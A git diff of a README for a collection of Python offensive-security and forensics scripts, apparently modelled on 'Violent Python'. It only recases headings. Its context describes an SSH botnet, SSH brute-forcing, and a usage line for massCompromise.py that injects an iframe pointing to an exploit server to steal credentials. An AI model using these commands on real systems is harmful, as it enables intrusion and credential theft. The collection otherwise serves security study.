@@ -23,7 +23,7 @@ taymour:∼# python portScan.py -H 10.50.60.125 -p "21, 1720"
 Scan the ports on the provided hosts.
 
 ## D) SSH_Botnet.py
-### BUILDING AN SSH BOTNET WITH PYTHON
+### Building An SSH Botnet
 Issue commands on ssh hosts at once provided you have the user names and passwords.
 
 ## E) sshBrute.py
@@ -39,7 +39,7 @@ Change IP, Root, Password to issue SSH commands on compromised machines.
 First you have to allow /etc/vsftpd.conf file to enable anon_login to yes or uncomment it  
 
 ## L) massCompromise.py  
-### MASS COMPROMISE BY BRIDGING FTP AND WEB
+### Mass comprise by bridging FTP and Web
 In command line following options are required to attack web pages and inject your own html file to steal compromised user credentials in default location  
 Usage from terminal      
 taymour# python massCompromise.py -H 192.168.95.179 -r '<iframe src="  
@@ -47,13 +47,13 @@ http://10.10.10.112:8080/exploit"></iframe>' -f userpass.txt
 
 # Forensic Investigations with Python
 ## M) discoverNetworks.py 
-### ANALYSIS OF WIRELESS ACCESS POINTS IN THE REGISTRY, Using Mechanize to Submit the MAC Address to Wigle
+### Analysis of wireless aaccess points-WAP in the registry, Using Mechanize to Submit the MAC Address to Wigle
 Allow to analyse connected wifi through mac adress by reading windows registry  
 Usage from command prompt    
 (py27) C:\Users\Taymour> python discoverNetworks.py -u <username> -p <password>  
   
 ## N) dumpRecycleBin.py  
-### RECOVER DELETED ITEMS IN THE RECYCLE BIN
+### Recover deleted items in the recycle bin
 Allows to discover deleted items in windows operating system ,also provide information about the user who delete files
 
 
@@ -73,7 +73,7 @@ python exifFetch.py -u http://www.flickr.com/photos/dvids/4999001925/sizes/o
 
 
 ## Q) skype-parse.py  
-### INVESTIGATING SKYPE APPLICATION ARTIFACTS
+### Investigating skype application artifacts
   
 List out variety of contents of skype in python console about skype user history name, tags, location, text messages etc  
 Usage#  
